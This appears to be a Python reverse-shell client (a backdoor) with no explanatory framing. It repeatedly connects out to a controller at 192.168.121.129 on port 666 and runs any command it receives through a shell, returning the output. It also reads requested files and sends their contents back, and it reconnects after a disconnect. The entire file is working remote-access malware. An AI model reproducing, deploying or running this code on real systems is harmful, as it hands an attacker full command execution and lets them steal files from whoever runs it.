
import socket
import os
import subprocess
import time
while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.121.129',666))
        s.send(os.getcwd().encode())
        while True:
            try:
                host = os.getcwd().encode()
                
                data = s.recv(18000).decode()
                

                if data.startswith('cd'):
                    path = data.split(' ')[1:]
                    path = ''.join(f'{i} ' if len(path) > 1 else i for i in path)
                    os.chdir(path)
                
                elif data == 'host':
                    s.sendall(os.getcwd().encode())

                elif data.startswith('cp'):
                    try:
                        file = data.split(' ')[1]
                        print(file)
                        with open(file,'r') as file:
                            content = file.read()
                            s.sendall(content.encode())
                    except Exception as e:
                        s.sendall('not found'.encode())
                        print(e)
                else:

                    blob = subprocess.Popen(data, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = blob.stdout.read()
                    if not output:
                        pass
                    if len(output.decode()) > 1:
                        if type(output) != bytes:
                            output = output.encode()
                    else:
                        output = f'"{data}" return nothing\n'.encode()
                    time.sleep(0.1)
                    s.sendall(output)
            except WindowsError: # after connection establish and disconnected
                    print('a')
                    time.sleep(3)
                    break
            except IndexError:
                print('a')
            except Exception as e:
                print(e)
                s.sendall('wrong'.encode())
            
    except ConnectionRefusedError:
        pass # connect again after server refuse
  
    


